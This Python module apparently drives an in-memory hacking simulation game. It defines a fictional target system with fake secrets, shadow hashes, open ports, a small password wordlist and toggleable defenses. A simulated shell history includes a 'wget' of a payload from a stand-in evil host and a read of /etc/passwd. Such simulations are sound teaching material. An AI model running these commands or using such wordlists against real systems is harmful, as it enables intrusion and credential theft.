"""
system.py — Virtual Target System
===================================
Simulates a fake OS with password, filesystem, and configurable defenses.
ALL activity is 100% in-memory simulation — no real network, no real auth.
"""

import random

# ─────────────────────────────────────────────────────────────
#  VIRTUAL FILESYSTEM  (purely fictional data)
# ─────────────────────────────────────────────────────────────
DEFAULT_FS = {
    "root": {
        "files": ["secrets.txt", "data.db", ".shadow"],
        "dirs":  ["docs", "logs", "home"]
    },
    "docs": {
        "files": ["report.pdf", "notes.txt", "budget.xlsx"],
        "dirs":  []
    },
    "logs": {
        "files": ["auth.log", "system.log", "access.log"],
        "dirs":  []
    },
    "home": {
        "files": ["profile.cfg", "history.txt"],
        "dirs":  ["admin"]
    },
    "admin": {
        "files": ["id_rsa", "authorized_keys", "creds.bak"],
        "dirs":  []
    },
}

# Simulated file contents — purely fictional
FILE_CONTENTS = {
    "secrets.txt":
        "[CLASSIFIED]\nDB_PASS=p@$$w0rd99\nAPI_KEY=sk-FAKE-abc123xyz\nROOT_TOKEN=ey.FAKE.token",
    "data.db":
        "[BINARY SQLITE DB — 4.2 MB]\nTables: users(512), sessions(1204), tokens(89)",
    ".shadow":
        "root:$6$FAKEHASH$xxxxxxxx:18900:0:99999:7:::\nadmin:$6$FAKEHASH$yyyyyyyy:19100::",
    "report.pdf":
        "[PDF DOCUMENT]\nTitle: Q3 Security Audit   Pages: 47\n\nEXECUTIVE SUMMARY:\nMultiple critical vulnerabilities identified...",
    "notes.txt":
        "TODO:\n- Fix SSH config\n- Rotate API keys (OVERDUE)\n- Patch CVE-2024-FAKE\n- Update firewall rules",
    "budget.xlsx":
        "[SPREADSHEET]\nIT Security Budget FY2025\nTotal: $2,400,000  |  Spent: $1,892,000",
    "auth.log":
        "Jan 14 03:22:18 sshd[1234]: Failed password for root from 192.168.1.55\n"
        "Jan 14 03:22:25 sshd[1234]: Accepted password for admin",
    "system.log":
        "Jan 14 09:00:01 systemd: Started daily security scan\n"
        "Jan 14 09:14:32 kernel: Possible SYN flood on eth0",
    "access.log":
        '192.168.1.1 - - [14/Jan/2025] "GET /admin" 403\n'
        '10.0.0.5   - - [14/Jan/2025] "POST /login" 200',
    "profile.cfg":
        "[user]\nname=admin\nlast_login=2025-01-14\nshell=/bin/bash",
    "history.txt":
        "sudo su\ncat /etc/passwd\nssh root@10.0.0.1\nwget http://evil.example.com/payload",
    "id_rsa":
        "-----BEGIN RSA PRIVATE KEY-----\n[SIMULATED — NOT REAL]\nMIIEpAIBAAKCAQEA[...TRUNCATED...]\n-----END RSA PRIVATE KEY-----",
    "authorized_keys":
        "ssh-rsa AAAAB3NzaC1yc2EAAAA[...FAKE...] admin@target-host",
    "creds.bak":
        "[BACKUP CREDENTIALS]\nadmin : admin123\nbackup : backup2024\ndev : devpass!",
}

# Simulated open ports
DEFAULT_PORTS = {
    22:   ("ssh",     "OpenSSH 8.9"),
    80:   ("http",    "Apache/2.4.57"),
    443:  ("https",   "nginx/1.25.3"),
    3306: ("mysql",   "MySQL 8.0.35"),
    8080: ("http-alt","Tomcat/9.0"),
    21:   ("ftp",     "vsftpd 3.0.5"),
}

BUILTIN_WORDLIST = [
    "password", "123456", "admin", "root", "letmein",
    "qwerty", "12345678", "password123", "admin123",
    "welcome", "monkey", "dragon", "master", "abc123",
]


# ─────────────────────────────────────────────────────────────
#  VIRTUAL SYSTEM STATE
# ─────────────────────────────────────────────────────────────
class VirtualSystem:
    """Represents the simulated target machine. All state in-memory."""

    def __init__(self):
        self.reset()

    def reset(self):
        self.password        = "admin123"
        self.access_granted  = False
        self.current_dir     = "root"
        self.firewall        = False
        self.ids             = False
        self.honeypot        = False
        self.intrusion_count = 0
        self.blocked_ips     = set()
        # Deep-copy the default FS so mutations don't affect defaults
        self.fs = {
            k: {"files": list(v["files"]), "dirs": list(v["dirs"])}
            for k, v in DEFAULT_FS.items()
        }
        self.ports       = dict(DEFAULT_PORTS)
        self.target_ip   = self._rand_ip()
        self.attacker_ip = self._rand_ip()

    @staticmethod
    def _rand_ip():
        return f"192.168.{random.randint(1,254)}.{random.randint(2,253)}"

    # ── Defender mutations ────────────────────────────────────

    def set_password(self, pw: str):
        self.password = pw

    def add_file(self, filename: str, dirname: str = None) -> bool:
        d = dirname or self.current_dir
        if d not in self.fs:
            self.fs[d] = {"files": [], "dirs": []}
        if filename not in self.fs[d]["files"]:
            self.fs[d]["files"].append(filename)
            return True
        return False

    def remove_file(self, filename: str, dirname: str = None) -> bool:
        d = dirname or self.current_dir
        if d in self.fs and filename in self.fs[d]["files"]:
            self.fs[d]["files"].remove(filename)
            return True
        return False

    def add_folder(self, name: str) -> bool:
        if name not in self.fs:
            self.fs[name] = {"files": [], "dirs": []}
            self.fs["root"]["dirs"].append(name)
            return True
        return False

    # ── Defense helpers ───────────────────────────────────────

    def enable_firewall(self):  self.firewall = True
    def disable_firewall(self): self.firewall = False
    def enable_ids(self):       self.ids = True
    def disable_ids(self):      self.ids = False
    def enable_honeypot(self):  self.honeypot = True
    def disable_honeypot(self): self.honeypot = False

    def defense_level(self) -> int:
        """0 = none, 1 = partial, 2 = full."""
        score = sum([self.firewall, self.ids, self.honeypot])
        return min(score, 2)

    def record_intrusion(self):
        self.intrusion_count += 1
        self.blocked_ips.add(self.attacker_ip)

    def status_summary(self) -> dict:
        return {
            "target_ip":  self.target_ip,
            "access":     self.access_granted,
            "firewall":   self.firewall,
            "ids":        self.ids,
            "honeypot":   self.honeypot,
            "password":   "●" * len(self.password),
            "intrusions": self.intrusion_count,
        }
